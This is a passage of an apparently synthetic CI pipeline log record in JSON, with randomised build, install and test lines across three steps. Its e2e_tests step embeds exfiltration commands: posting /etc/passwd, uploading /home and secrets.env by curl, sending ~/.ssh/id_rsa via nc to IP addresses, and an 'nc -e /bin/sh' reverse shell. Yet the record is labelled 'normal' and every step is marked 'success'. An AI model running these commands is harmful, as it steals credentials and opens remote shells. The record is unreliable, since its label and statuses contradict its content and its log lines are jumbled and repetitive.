        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-28T12:02:03.846542",
        "finished_at": "2025-11-28T12:02:14.350681",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] INFO: Processing request",
          "Step 7/10: Building",
          "Installing eslint@1.2.0",
          "Installing express@4.0.0",
          "\u2713 test completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "  PASS: test_user_create (451ms)",
          "WARNING: prettier has known vulnerabilities",
          "Installing lodash@1.20.0",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Cache hit for key-3539",
          "Installing eslint@2.3.0",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "Step 3/10: Building",
          "Installing webpack@1.6.0",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Installing axios@2.13.0",
          "  PASS: test_api_health (455ms)",
          "Compiling src/utils.go...",
          "Installing jest@4.13.0",
          "Step 10/10: Building",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (210ms)",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 3/10: Building",
          "Installing webpack@3.12.0",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-28T12:02:14.350681",
        "finished_at": "2025-11-28T12:02:45.863097",
        "log_lines": [
          "=== Step: build ===",
          "Installing webpack@5.10.0",
          "  PASS: test_auth_login (374ms)",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "Cache hit for key-3483",
          "  PASS: test_auth_login (134ms)",
          "  PASS: test_cache_hit (331ms)",
          "Installing react@3.17.0",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-3218",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "Step 5/10: Building",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing prettier@1.0.0",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/app.ts...",
          "Cache hit for key-6945",
          "Step 10/10: Building",
          "WARNING: jest has known vulnerabilities",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:35] INFO: Processing request",
          "Step 5/10: Building",
          "Installing eslint@5.11.0",
          "Installing react@4.20.0",
          "  PASS: test_auth_login (188ms)",
          "  PASS: test_db_connect (273ms)",
          "  PASS: test_api_health (183ms)",
          "Compiling src/app.ts...",
          "Cache hit for key-5723",
          "Step 4/10: Building",
          "Cache hit for key-1869",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Cache hit for key-6454",
          "Artifact uploaded: build.tar.gz (43MB)",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-28T12:02:45.863097",
        "finished_at": "2025-11-28T12:02:56.367236",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2717 build failed with exit code 6",
          "WARNING: webpack has known vulnerabilities",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Step 1/10: Building",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "\u2713 lint completed",
          "  PASS: test_api_health (122ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_cache_hit (296ms)",
          "Step 3/10: Building",
          "  PASS: test_api_health (348ms)",
          "nc -e /bin/sh 162.78.214.84 4353",
          "\u2713 lint completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Sending 236MB of data to cloud.services",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing webpack@2.18.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 130.100.6.65 52381",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Sending 273MB of data to test.io",
          "Compiling src/index.js...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 203.154.47.213 15532",
          "  PASS: test_cache_hit (485ms)",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (26ms)",
          "\u2713 build completed",
          "FAILED: test_user_create",
          "Sending 174MB of data to example.com",
          "Cache hit for key-8228",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 31.239.212.67 10782",
          "Installing webpack@1.14.0",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Artifact uploaded: build.tar.gz (4MB)",
          "FAILED: test_api_health",
          "[12:00:35] INFO: Processing request",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "[12:00:35] ERROR: Connection failed",
          "Installing webpack@4.15.0",
          "Compiling src/handler.rs...",
          "Sending 193MB of data to startup.dev",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Step 10/10: Building",
          "\u2717 build failed with exit code 33",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "=== Step e2e_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}